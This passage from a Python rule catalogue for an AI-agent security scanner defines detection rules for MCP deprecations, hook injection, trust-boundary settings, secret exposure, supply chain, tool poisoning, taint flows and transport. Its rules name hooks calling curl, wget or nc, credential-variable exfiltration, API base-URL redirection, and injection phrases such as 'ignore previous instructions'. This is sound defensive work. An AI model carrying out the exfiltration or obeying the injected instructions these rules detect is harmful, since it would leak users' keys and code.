    "tool catalogs.",
    Severity.LOW,
    Category.MCP_CONFIG,
    "Cache the `tools/list` response client-side with an explicit TTL "
    "(`ttlMs`) and refresh it on cache miss or on a server-pushed "
    "`notifications/tools/list_changed`. Treat tool discovery as a hint "
    "that may differ between instances under the stateless transport.",
    sarif_name="McpClientNoToolsListCache",
    owasp_mcp_references=["MCP07:2025"],
)

# ---------------------------------------------------------------------------
# AAK-MCP-DEPRECATED-001..003 — 2026-07-28 deprecated protocol features.
#
# The MCP 2026-07-28 spec release candidate is the first to ship a formal
# deprecation policy (SEP-2596): a minimum 12-month window between deprecation
# and removal. Under it, SEP-2577 annotation-deprecates three core features —
# `roots`, `sampling`, and `logging`. They remain functional in every spec
# version published within 12 months of 2026-07-28 (runway to ~mid-2027), but
# they are on the removal path and each has a documented replacement:
#   - roots     -> pass workspace paths as tool parameters / server config.
#   - sampling  -> call the LLM provider API directly from the server.
#   - logging   -> emit to stderr or OpenTelemetry instead of `logging/setLevel`.
# These three rules surface continued use of the deprecated surfaces so authors
# can migrate inside the 12-month window rather than break on removal. Distinct
# from AAK-MCP-SAMPLING-001 (a *consent* guard on sampling) and the
# AAK-MCP-STATELESS-* pack (the session/tasks transport changes of the same RC).
#
# Sources:
#   https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/
#   https://modelcontextprotocol.io/seps/2577  (deprecate roots/sampling/logging)
#   https://modelcontextprotocol.io/seps/2596  (12-month deprecation policy)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-DEPRECATED-001",
    "Use of deprecated `roots` capability (roots/list)",
    "Server or client code declares or exercises the `roots` capability — "
    "the `roots/list` request, the `notifications/roots/list_changed` "
    "notification, or the SDK aliases (`list_roots`, `ListRootsRequest`, "
    "`send_roots_list_changed`). The MCP 2026-07-28 spec release candidate "
    "deprecates `roots` (SEP-2577) under the new 12-month deprecation policy "
    "(SEP-2596): it stays functional for at least a year but is on the "
    "removal path. Roots leaked the client's workspace layout to every "
    "connected server, which the RC judged an unnecessary standing surface.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Migrate before removal: stop advertising / handling the `roots` "
    "capability and pass the specific workspace paths a tool needs as "
    "explicit tool parameters or server configuration instead. Deprecated "
    "2026-07-28; plan to remove ahead of the ~mid-2027 window.",
    sarif_name="McpDeprecatedRoots",
    owasp_mcp_references=["MCP07:2025"],
)

_r(
    "AAK-MCP-DEPRECATED-002",
    "Use of deprecated `sampling` capability (sampling/createMessage)",
    "Server or client code declares or exercises the `sampling` capability — "
    "the `sampling/createMessage` request, a `CreateMessageRequest` handler, "
    "or the SDK aliases (`create_message`, `.sampling.create`). The MCP "
    "2026-07-28 spec release candidate deprecates `sampling` (SEP-2577) under "
    "the 12-month deprecation policy (SEP-2596). Server-initiated sampling "
    "made the server a privileged caller of the host LLM and had no clean "
    "stateless story; it is on the removal path. (Distinct from "
    "AAK-MCP-SAMPLING-001, which flags sampling wired up without a consent "
    "gate — this rule flags the deprecated capability itself.)",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Migrate before removal: instead of asking the client to sample via "
    "`sampling/createMessage`, call the LLM provider API directly from the "
    "server with its own credentials. Deprecated 2026-07-28; plan to remove "
    "ahead of the ~mid-2027 window.",
    sarif_name="McpDeprecatedSampling",
    owasp_mcp_references=["MCP07:2025"],
)

_r(
    "AAK-MCP-DEPRECATED-003",
    "Use of deprecated `logging` capability (logging/setLevel)",
    "Server or client code declares or exercises the `logging` capability — "
    "the `logging/setLevel` request, the `notifications/message` log "
    "notification, or the SDK aliases (`set_level`, `SetLevelRequest`, "
    "`LoggingMessageNotification`, `LoggingLevel`). The MCP 2026-07-28 spec "
    "release candidate deprecates `logging` (SEP-2577) under the 12-month "
    "deprecation policy (SEP-2596). Protocol-level log-level control was "
    "redundant with host-side observability and is on the removal path.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Migrate before removal: emit logs to stderr or an OpenTelemetry "
    "exporter and control verbosity out-of-band, rather than advertising the "
    "`logging` capability / handling `logging/setLevel`. Deprecated "
    "2026-07-28; plan to remove ahead of the ~mid-2027 window.",
    sarif_name="McpDeprecatedLogging",
    owasp_mcp_references=["MCP07:2025"],
)

# ---------------------------------------------------------------------------
# Hook Injection Detection (9 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-HOOK-001",
    "Hook executes network-capable command",
    "A hook command contains network-capable tools (curl, wget, nc, etc.). "
    "Hooks run automatically and can exfiltrate code, API keys, or session data.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Remove network calls from hooks. Use file-based logging if audit trail is needed.",
    sarif_name="HookNetworkCapableCommand",
    cve_references=["CVE-2025-59536"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-EXFIL-01"],
)

_r(
    "AAK-HOOK-002",
    "Hook command contains environment variable exfiltration",
    "A hook command accesses credential environment variables. "
    "This enables direct credential theft via hook execution.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Hooks should never reference credential environment variables.",
    sarif_name="HookCredentialExfiltration",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-02"],
)

_r(
    "AAK-HOOK-003",
    "Hook command writes to files outside project directory",
    "A hook command writes to paths outside the project boundary, "
    "which can modify system configs, plant persistence, or stage exfiltration.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Constrain all hook file operations to project directory.",
    sarif_name="HookWriteOutsideProject",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-ESCAPE-01"],
)

_r(
    "AAK-HOOK-004",
    "Hook on security-sensitive lifecycle event",
    "A non-formatting hook is attached to a sensitive lifecycle event "
    "(PreToolUse, PostToolUse, SessionStart, UserPromptSubmit). "
    "These events fire on every tool call or session start.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Audit all hooks on critical lifecycle events. Use deny-lists for non-formatting commands.",
    sarif_name="HookSensitiveLifecycleEvent",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-HOOK-01"],
)

_r(
    "AAK-HOOK-005",
    "Hook command uses base64 encoding/decoding",
    "A hook command contains base64 operations, commonly used to obfuscate "
    "exfiltration payloads or encode stolen credentials.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Remove base64 operations from hooks unless there's a documented, legitimate use case.",
    sarif_name="HookBase64Obfuscation",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-OBFUSC-01"],
)

_r(
    "AAK-HOOK-006",
    "Hook command runs with elevated privileges",
    "A hook command uses sudo, doas, pkexec, or chmod +x. "
    "Hooks should never require elevated privileges.",
    Severity.MEDIUM,
    Category.HOOK_INJECTION,
    "Hooks should never require elevated privileges.",
    sarif_name="HookPrivilegeEscalation",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-PRIV-01"],
)

_r(
    "AAK-HOOK-007",
    "Excessive number of hooks defined",
    "More than 15 hook definitions in a single settings file. "
    "Large hook surface increases audit burden and risk of hidden malicious hooks.",
    Severity.MEDIUM,
    Category.HOOK_INJECTION,
    "Minimize hooks to essential operations only.",
    sarif_name="ExcessiveHookCount",
    owasp_mcp_references=["MCP02:2025", "MCP08:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SCOPE-03"],
)

_r(
    "AAK-HOOK-008",
    "Hook command contains obfuscated or encoded payload",
    "A hook command contains hex-encoded strings, unicode escapes, very long commands, "
    "or nested shell invocations. Obfuscation is a strong indicator of malicious intent.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "All hook commands should be human-readable. Reject obfuscated commands.",
    sarif_name="HookObfuscatedPayload",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-OBFUSC-02"],
)

_r(
    "AAK-HOOK-009",
    "Hook command references project source files",
    "A hook command reads or references project source code files, "
    "which could enable code exfiltration.",
    Severity.MEDIUM,
    Category.HOOK_INJECTION,
    "Hooks should not access source files. Use dedicated build tools instead.",
    sarif_name="HookReferencesSourceFiles",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-EXFIL-02"],
)

# ---------------------------------------------------------------------------
# Trust Boundary Violations (7 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-TRUST-001",
    "enableAllProjectMcpServers is true",
    "Auto-approves ALL MCP servers in .mcp.json without user consent. "
    "A compromised repo can ship arbitrary MCP servers that execute immediately.",
    Severity.CRITICAL,
    Category.TRUST_BOUNDARY,
    "Set to false. Use enabledMcpjsonServers to whitelist specific servers by name.",
    sarif_name="EnableAllProjectMcpServers",
    cve_references=["CVE-2026-21852"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-TRUST-01"],
    auto_fixable=True,
)

_r(
    "AAK-TRUST-002",
    "ANTHROPIC_BASE_URL overridden in project settings",
    "Redirects all API traffic (including API keys) to attacker-controlled endpoint "
    "BEFORE trust prompt displays. This is the exact attack vector of CVE-2026-21852.",
    Severity.CRITICAL,
    Category.TRUST_BOUNDARY,
    "NEVER override ANTHROPIC_BASE_URL in project settings. Only set in user-level or system environment.",
    sarif_name="AnthropicBaseUrlOverride",
    cve_references=["CVE-2026-21852"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-REDIRECT-01"],
)

_r(
    "AAK-TRUST-003",
    "Wildcard or overly broad permission allows",
    "Permission allow patterns use wildcards (*, **) or broad tool names. "
    "This bypasses the permission system, allowing unchecked tool execution.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Use narrowest possible permission patterns. Specify exact tool names and path constraints.",
    sarif_name="WildcardPermissionAllow",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-SCOPE-04"],
)

_r(
    "AAK-TRUST-004",
    "No deny rules defined",
    "Settings file has permission allows but empty or missing deny rules. "
    "Defense-in-depth requires explicit deny rules for sensitive operations.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Add deny rules for: file system operations outside project, network tools, credential-accessing tools.",
    sarif_name="MissingDenyRules",
    owasp_mcp_references=["MCP05:2025", "MCP08:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TRUST-02"],
    auto_fixable=True,
)

_r(
    "AAK-TRUST-005",
    "Custom API base URL for any provider",
    "An environment variable matching *_BASE_URL, *_API_URL, or *_ENDPOINT is set "
    "in project settings. This can redirect authenticated traffic to attacker-controlled servers.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Set API URLs only in user-level configuration or system environment variables.",
    sarif_name="CustomApiBaseUrlOverride",
    cve_references=["CVE-2026-21852"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-REDIRECT-02"],
)

_r(
    "AAK-TRUST-006",
    "Project settings may override user deny rules",
    "Project settings have permission allows that could shadow user-level deny rules. "
    "Misconfigurations can create a false sense of security.",
    Severity.MEDIUM,
    Category.TRUST_BOUNDARY,
    "Audit that project allows don't re-enable operations the user intended to block.",
    sarif_name="ProjectOverridesUserDeny",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-TRUST-03"],
)

_r(
    "AAK-TRUST-007",
    "No MCP server allowlist configured",
    "No enabledMcpjsonServers allowlist is configured, meaning server approval "
    "relies entirely on user prompts.",
    Severity.MEDIUM,
    Category.TRUST_BOUNDARY,
    "Configure enabledMcpjsonServers with explicit server names.",
    sarif_name="NoMcpServerAllowlist",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TRUST-04"],
    auto_fixable=True,
)

# ---------------------------------------------------------------------------
# API Key & Secret Exposure (9 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-SECRET-001",
    "Anthropic API key exposed",
    "An Anthropic API key (sk-ant-*) was found in a project file. "
    "This allows full API access and billing abuse.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Remove key, rotate immediately, use environment variables.",
    sarif_name="AnthropicApiKeyExposed",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-03"],
)

_r(
    "AAK-SECRET-002",
    "OpenAI API key exposed",
    "An OpenAI API key (sk-*) was found in a project file.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Remove key, rotate immediately, use environment variables.",
    sarif_name="OpenaiApiKeyExposed",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-04"],
)

_r(
    "AAK-SECRET-003",
    "AWS credentials exposed",
    "AWS access key ID or secret access key found in a project file.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Use IAM roles, AWS SSO, or secrets manager.",
    sarif_name="AwsCredentialsExposed",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-05"],
)

_r(
    "AAK-SECRET-004",
    "Generic high-entropy secret",
    "A value assigned to a secret-like key has high Shannon entropy, "
    "indicating a likely credential or API key.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Move to environment variables or secrets manager.",
    sarif_name="GenericHighEntropySecret",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-06"],
)

_r(
    "AAK-SECRET-005",
    "Private key file present",
    "A private key file (*.pem, *.key, id_rsa, etc.) or PEM content was found in the project.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Remove private keys from repository, add to .gitignore.",
    sarif_name="PrivateKeyFilePresent",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-07"],
)

_r(
    "AAK-SECRET-006",
    ".env file not in .gitignore",
    "A .env file exists but .gitignore does not contain a .env exclusion pattern.",
    Severity.MEDIUM,
    Category.SECRET_EXPOSURE,
    "Add .env* to .gitignore.",
    sarif_name="EnvFileNotInGitignore",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-08"],
    auto_fixable=True,
)

_r(
    "AAK-SECRET-007",
    "Secret in MCP server environment block",
    "Hardcoded secret values found in mcpServers env blocks in non-.mcp.json files.",
    Severity.MEDIUM,
    Category.SECRET_EXPOSURE,
    "Use environment variable references.",
    sarif_name="SecretInMcpEnvBlock",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-09"],
)

_r(
    "AAK-SECRET-008",
    "GitHub/GitLab personal access token exposed",
    "A GitHub or GitLab personal access token (ghp_*, glpat-*) was found in a project file.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Remove token, rotate immediately, use environment variables.",
    sarif_name="GitTokenExposed",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-10"],
)

_r(
    "AAK-SECRET-009",
    "Google Cloud service account key file",
    "A Google Cloud service account key JSON file was found in the project.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Remove key file, use workload identity or environment-based auth.",
    sarif_name="GcpServiceAccountKey",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-11"],
)

# ---------------------------------------------------------------------------
# Dependency Supply Chain (6 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-SUPPLY-001",
    "MCP server package not pinned to exact version",
    "MCP server args contain package names without @x.y.z version pinning. "
    "Unpinned packages fetch latest at runtime, vulnerable to rug pull attacks.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin to exact version. Example: @modelcontextprotocol/server-filesystem@2025.1.1",
    sarif_name="McpPackageNotPinned",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-03"],
)

_r(
    "AAK-SUPPLY-002",
    "Known vulnerable package in lockfile",
    "A package with known MCP/AI-agent-related vulnerabilities was found in the dependency tree.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Update to patched version or remove dependency.",
    sarif_name="KnownVulnerablePackage",
    owasp_mcp_references=["MCP03:2025", "MCP10:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-04"],
)

_r(
    "AAK-SUPPLY-003",
    "Dependency uses install scripts",
    "package.json has install scripts (preinstall, postinstall, etc.) that execute "
    "arbitrary commands during npm install.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Audit install scripts. Use --ignore-scripts flag and run scripts manually after review.",
    sarif_name="DangerousInstallScripts",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-05"],
)

_r(
    "AAK-SUPPLY-004",
    "No lockfile present",
    "A package manifest exists but no lockfile was found. "
    "Without lockfiles, dependency versions float and can be silently updated.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Generate and commit lockfile.",
    sarif_name="NoLockfilePresent",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-06"],
)

_r(
    "AAK-SUPPLY-005",
    "Dependency count exceeds threshold",
    "More than 200 direct + transitive dependencies in lockfile. "
    "Each dependency is a trust decision.",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Audit and remove unused dependencies. Consider lighter alternatives.",
    sarif_name="ExcessiveDependencyCount",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-07"],
)

_r(
    "AAK-SUPPLY-006",
    "Dependency with known MCP-specific vulnerability",
    "A dependency has a known vulnerability specifically affecting MCP/agent tooling.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Update to patched version as listed in the vulnerability database.",
    sarif_name="McpSpecificVulnDep",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-08"],
)

# ---------------------------------------------------------------------------
# Agent Config (5 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-AGENT-001",
    "Agent instruction file contains shell command directives",
    "An agent instruction file (AGENTS.md, .cursorrules, CLAUDE.md) contains shell commands "
    "or execution directives that could be injected into agent behavior.",
    Severity.CRITICAL,
    Category.AGENT_CONFIG,
    "Remove shell commands from agent instruction files. Use proper tool definitions instead.",
    sarif_name="AgentShellDirectives",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-HIJACK-01"],
)

_r(
    "AAK-AGENT-002",
    "Agent instructions reference external URLs",
    "Agent instruction files reference external URLs that could serve as C2 channels "
    "or data exfiltration endpoints.",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Remove external URL references from agent instructions.",
    sarif_name="AgentExternalUrls",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-HIJACK-02"],
)

_r(
    "AAK-AGENT-003",
    "Agent instructions override security controls",
    "Agent instructions contain patterns that attempt to disable or bypass security controls "
    "(e.g., 'ignore security warnings', 'skip verification').",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Remove security override instructions. Agents should respect default security controls.",
    sarif_name="AgentSecurityOverride",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-HIJACK-03"],
)

_r(
    "AAK-AGENT-004",
    "Agent instructions contain credential references",
    "Agent instruction files reference credentials, API keys, or environment variables.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Remove credential references from instruction files.",
    sarif_name="AgentCredentialReference",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-HIJACK-04"],
)

_r(
    "AAK-AGENT-005",
    "Agent instruction file contains hidden content",
    "Agent instruction files contain hidden content via HTML comments, zero-width characters, "
    "or Unicode tricks that may manipulate agent behavior covertly.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Remove hidden content. All agent instructions should be human-readable.",
    sarif_name="AgentHiddenContent",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-HIJACK-05"],
)

# ---------------------------------------------------------------------------
# Tool Poisoning (6 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-POISON-001",
    "Invisible Unicode characters in tool description",
    "Tool description contains invisible Unicode characters (zero-width joiners, RTL overrides, "
    "invisible separators) that could hide malicious instructions.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Remove invisible characters from tool descriptions.",
    sarif_name="ToolDescInvisibleUnicode",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-POISON-01"],
)

_r(
    "AAK-POISON-002",
    "Prompt injection patterns in tool description",
    "Tool description contains prompt injection patterns such as 'ignore previous instructions', "
    "'system:', or role-switching directives.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Remove injection patterns from tool descriptions.",
    sarif_name="ToolDescPromptInjection",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-POISON-02"],
)

_r(
    "AAK-POISON-003",
    "Cross-tool reference in tool description",
    "Tool description references other tools by name, potentially triggering chain calls "
    "(e.g., 'before using this tool, first call X').",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Tool descriptions should be self-contained and not reference other tools.",
    sarif_name="ToolDescCrossToolRef",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-POISON-03"],
)

_r(
    "AAK-POISON-004",
    "Encoded content in tool description",
    "Tool description contains base64, hex, or URL-encoded content that could hide "
    "malicious instructions.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "All tool description content should be plain text.",
    sarif_name="ToolDescEncodedContent",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-POISON-04"],
)

_r(
    "AAK-POISON-005",
    "Excessive tool description length",
    "Tool description exceeds 500 characters, which increases the surface area "
    "for hidden instructions.",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Keep tool descriptions concise and under 500 characters.",
    sarif_name="ToolDescExcessiveLength",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-POISON-05"],
)

_r(
    "AAK-POISON-006",
    "URL or file path in tool description",
    "Tool description contains URLs or file paths that could direct the agent "
    "to access external resources.",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Remove URLs and file paths from tool descriptions.",
    sarif_name="ToolDescUrlOrPath",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-POISON-06"],
)

# ---------------------------------------------------------------------------
# Taint Analysis (8 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-TAINT-001",
    "Tool parameter flows to shell command",
    "A @tool function parameter is passed to os.system(), subprocess, or similar "
    "shell execution functions without sanitization.",
    Severity.CRITICAL,
    Category.TAINT_ANALYSIS,
    "Sanitize all inputs. Use subprocess with shell=False and explicit argument lists.",
    sarif_name="TaintShellInjection",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-04"],
)

_r(
    "AAK-TAINT-002",
    "Tool parameter flows to eval/exec",
    "A @tool function parameter flows to eval(), exec(), or compile() enabling "
    "arbitrary code execution.",
    Severity.CRITICAL,
    Category.TAINT_ANALYSIS,
    "Never pass user-controlled input to eval/exec. Use safe parsing alternatives.",
    sarif_name="TaintCodeInjection",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-05"],
)

_r(
    "AAK-TAINT-003",
    "Tool parameter flows to file open",
    "A @tool function parameter is used in open() or file path construction, "
    "enabling path traversal attacks.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Validate and sanitize file paths. Use os.path.realpath() and verify against allowed directories.",
    sarif_name="TaintPathTraversal",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-06"],
)

_r(
    "AAK-TAINT-004",
    "Tool parameter flows to HTTP request",
    "A @tool function parameter is passed to requests.get/post or urllib, "
    "enabling SSRF attacks.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Validate URLs against an allowlist. Block internal/private IP ranges.",
    sarif_name="TaintSsrf",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-SSRF-02"],
)

_r(
    "AAK-TAINT-005",
    "Tool parameter flows to SQL query",
    "A @tool function parameter is used in cursor.execute() or similar database query "
    "functions via string formatting.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Use parameterized queries. Never use f-strings or .format() for SQL.",
    sarif_name="TaintSqlInjection",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-07"],
)

_r(
    "AAK-TAINT-006",
    "Tool parameter flows to deserialization",
    "A @tool function parameter is passed to pickle.loads(), yaml.load(), or similar "
    "deserialization functions.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Use safe deserialization (yaml.safe_load, json.loads) instead of unsafe alternatives.",
    sarif_name="TaintDeserialization",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-08"],
)

_r(
    "AAK-TAINT-007",
    "Tool function missing input validation",
    "A @tool function has no type hints or input validation on its parameters.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Add type hints and input validation to all tool function parameters.",
    sarif_name="TaintMissingValidation",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-VALID-01"],
)

_r(
    "AAK-TAINT-008",
    "Tool function with excessive dangerous sinks",
    "A @tool function accesses more than 3 different dangerous sinks, indicating "
    "overly broad permissions.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Split into smaller, focused tool functions with minimal privileges.",
    sarif_name="TaintExcessiveSinks",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SCOPE-05"],
)

# ---------------------------------------------------------------------------
# Transport Security (4 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-TRANSPORT-001",
    "MCP server uses HTTP instead of HTTPS",
    "An MCP server URL uses HTTP instead of HTTPS, exposing all traffic "
    "including credentials to interception.",
    Severity.CRITICAL,
    Category.TRANSPORT_SECURITY,
    "Use HTTPS for all remote MCP server connections.",
    sarif_name="McpHttpNotHttps",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TRANSPORT-01"],
)

_r(
    "AAK-TRANSPORT-002",
    "TLS certificate validation disabled",
    "TLS certificate validation is disabled via NODE_TLS_REJECT_UNAUTHORIZED=0 or similar, "
    "enabling MITM attacks.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Remove TLS validation overrides. Use proper certificate management.",
    sarif_name="McpTlsValidationDisabled",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TRANSPORT-02"],
)

_r(
    "AAK-TRANSPORT-003",
    "Deprecated SSE transport in use",
    "An MCP server uses deprecated Server-Sent Events (SSE) transport instead of "
    "Streamable HTTP.",
    Severity.MEDIUM,
    Category.TRANSPORT_SECURITY,
    "Migrate to Streamable HTTP transport (MCP spec 2025-03-26+).",
    sarif_name="McpDeprecatedSse",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI08"],
    adversa_references=["ADV-TRANSPORT-03"],
)

_r(
    "AAK-TRANSPORT-004",
    "Session token in URL query parameter",
    "A session token or API key is passed as a URL query parameter, risking exposure "
    "in logs and referrer headers.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Pass tokens in HTTP headers instead of URL query parameters.",
    sarif_name="McpTokenInUrl",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-12"],
)

# ---------------------------------------------------------------------------
# A2A Protocol (7 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-A2A-001",
    "Agent Card exposes internal capabilities",
    "An A2A Agent Card exposes internal capabilities or admin-level skills that should "
    "not be advertised externally.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Limit Agent Card capabilities to public-facing skills only.",
    sarif_name="A2aInternalCapabilities",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-01"],
)

_r(
    "AAK-A2A-002",
    "Agent Card lacks authentication requirement",
    "An A2A Agent Card does not require authentication for interactions.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Add authentication requirements (OAuth 2.0 or API key) to Agent Card.",
    sarif_name="A2aNoAuth",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-02"],
)

_r(
    "AAK-A2A-003",
    "No input schema validation in A2A skill definitions",
